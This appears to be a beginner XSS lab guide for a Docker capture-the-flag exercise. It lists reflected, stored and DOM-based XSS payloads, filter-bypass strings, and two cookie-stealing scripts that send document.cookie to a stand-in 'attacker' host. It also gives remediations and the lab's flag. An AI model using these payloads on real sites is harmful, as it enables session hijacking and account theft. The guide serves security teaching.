---
name: detecting-xss-vulnerabilities-in-web-apps
description: >-
  Detect reflected, stored, and DOM-based Cross-Site Scripting (XSS) vulnerabilities
  in web applications using manual payloads and browser-based analysis inside
  isolated lab environments. Covers OWASP A03 injection and sanitization bypass.
domain: cybersecurity
subdomain: web-application-testing
tags: [xss, cross-site-scripting, owasp-a03, web-security, beginner, javascript]
difficulty: beginner
mitre_techniques: [T1190, T1059.007]
nist_csf_functions: [Identify, Protect]
version: "1.0"
author: mukul975
license: Apache-2.0
lab_environment: labs/web-application/xss-reflected
---

> ⚠️ **Educational Use Only** — Practice exclusively in the provided Docker lab. XSS exploitation against unauthorized systems is illegal. This skill is for understanding vulnerabilities to build better defenses and pass security assessments on authorized targets.

## When to Use

- During authorized web application penetration tests, assessing all user-controlled input for script injection
- In CTF challenges requiring session hijacking or UI redressing via script injection
- When reviewing code for missing output encoding or Content Security Policy headers
- As a prerequisite for understanding stored XSS, CSRF, and clickjacking attack chains
- When validating that WAF (Web Application Firewall) rules correctly block script injection

## Prerequisites

- **Software:** Docker + Docker Compose, modern browser with DevTools
- **Knowledge:** Basic HTML structure, what JavaScript does in a browser, what cookies are
- **Lab:** `labs/web-application/xss-reflected` — start with `agentlab start xss-reflected`
- **Difficulty:** Beginner
- **Time:** 30–45 minutes

## Workflow

### Step 1: Start the Lab

```bash
agentlab start xss-reflected
# Access at http://localhost:8081 from your browser (mapped to the lab container)
```

The lab contains three XSS scenarios: reflected, stored, and DOM-based.

### Step 2: Identify Reflection Points

Look for places where user input is echoed back in the HTML response:

- Search boxes (value reflected in "You searched for: X")
- Error messages (username reflected in "Welcome back, X")
- URL parameters reflected in the page body
- Comment/feedback forms (stored and displayed to other users)

### Step 3: Test for Reflected XSS

Inject a basic script tag into a search or parameter field:

```
Payload: <script>alert(1)</script>
URL: http://localhost:8081/search?q=<script>alert(1)</script>
```

**Positive indicator:** An alert box appears in the browser.

If basic tags are filtered, try encoding bypasses:

```html
<!-- HTML entity encoding -->
&lt;script&gt;alert(1)&lt;/script&gt;

<!-- Mixed case bypass -->
<ScRiPt>alert(1)</ScRiPt>

<!-- Event handler injection (when tags are blocked) -->
"><img src=x onerror=alert(1)>

<!-- JavaScript protocol in href -->
<a href="javascript:alert(1)">click</a>

<!-- SVG vector -->
<svg onload=alert(1)>
```

### Step 4: Test for Stored XSS

In the comment/feedback form, submit a persistent payload:

```html
<!-- Submit as a comment -->
<script>alert('stored xss')</script>

<!-- Stealer payload (lab-safe — logs to lab container, not external) -->
<script>document.location='http://attacker/steal?c='+document.cookie</script>
```

Navigate away and return to the page. If the script executes on page load, stored XSS is confirmed.

### Step 5: Test for DOM-Based XSS

DOM XSS is processed entirely in the browser without touching the server. Look for URL fragment (#) or hash usage:

```javascript
// Vulnerable pattern in page source:
document.getElementById('msg').innerHTML = location.hash.substring(1);

// Exploit by navigating to:
http://localhost:8081/page#<img src=x onerror=alert(1)>
```

Open browser DevTools → Console and look for errors or execution when injecting into hash parameters.

### Step 6: Verify CSP Bypass

Check the `Content-Security-Policy` header:

```bash
curl -I http://localhost:8081/ | grep -i "content-security-policy"
```

If no CSP or a weak one is present, note it as a finding. A strong CSP (`script-src 'self'`) would block inline scripts.

### Step 7: Capture the Flag

The lab flag is stored in the admin's session cookie. Use the XSS to exfiltrate it within the isolated lab:

```html
<!-- The lab includes a simulated admin bot that visits flagged comments -->
<!-- Plant this in the stored XSS field: -->
<script>
  var img = new Image();
  img.src = 'http://attacker:9000/steal?cookie=' + encodeURIComponent(document.cookie);
</script>
```

Check the attacker container logs:
```bash
agentlab logs xss-reflected attacker
# Look for: steal?cookie=session=FLAG{...}
```

## Key Concepts

| Concept | Definition |
|---------|-----------|
| Reflected XSS | Script is in the HTTP request and reflected back immediately in the response |
| Stored XSS | Script is saved to the database and executed whenever any user loads the affected page |
| DOM-Based XSS | Script is injected and executed via client-side JavaScript without the payload touching the server |
| Payload | The injected code, typically a script tag or event handler, that executes in a victim's browser |
| Output Encoding | Escaping `<`, `>`, `"`, `'` before inserting user data into HTML — the primary defense |
| CSP | Content Security Policy — HTTP header that restricts which scripts the browser may execute |
| T1059.007 | MITRE ATT&CK: Command and Scripting Interpreter: JavaScript |

## Tools

| Tool | Purpose | Lab Availability |
|------|---------|-----------------|
| Browser DevTools | Inspect DOM, console, network requests | ✅ Available |
| `curl` | Test headers and raw responses | ✅ Pre-installed |
| Burp Suite | Intercept and modify requests | ⚠️ Install separately |
| XSStrike | Automated XSS detection and bypass | ✅ Pre-installed in attacker container |

## Common Scenarios

### Scenario 1: Reflected XSS via Search Parameter

URL: `http://target/search?q=sneakers`
Page HTML: `<p>Results for: sneakers</p>`

Injecting `<script>alert(1)</script>` as `q` produces:
`<p>Results for: <script>alert(1)</script></p>` — script executes.

**Fix:** Encode output. In PHP: `htmlspecialchars($q, ENT_QUOTES, 'UTF-8')`

### Scenario 2: Stored XSS in Comment Section

A comment with `<script>alert('pwned')</script>` is saved and displayed to every user who views the page, not just the attacker.

**Fix:** Sanitize on input (allow-list), encode on output. Use a library like DOMPurify for client-side, or OWASP Java HTML Sanitizer server-side.

### Scenario 3: Bypassing Simple Filters

Application strips `<script>` but doesn't encode event handlers:

```html
<!-- Bypasses <script> filter -->
<img src=invalid onerror="alert(document.domain)">
```

**Fix:** Use an allow-list approach (only allow specific safe tags/attributes), not a deny-list.

## Output / Verification

```bash
# Submit captured flag
agentlab verify xss-reflected "FLAG{xss_cookie_stolen}"
```

**Score:** 100 points for reflected XSS flag, 150 points for stored XSS cookie theft

## Further Reading

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
- MITRE ATT&CK: [T1190](https://attack.mitre.org/techniques/T1190/) | [T1059.007](https://attack.mitre.org/techniques/T1059/007/)
- [Google XSS Game](https://xss-game.appspot.com/) — additional practice (external)
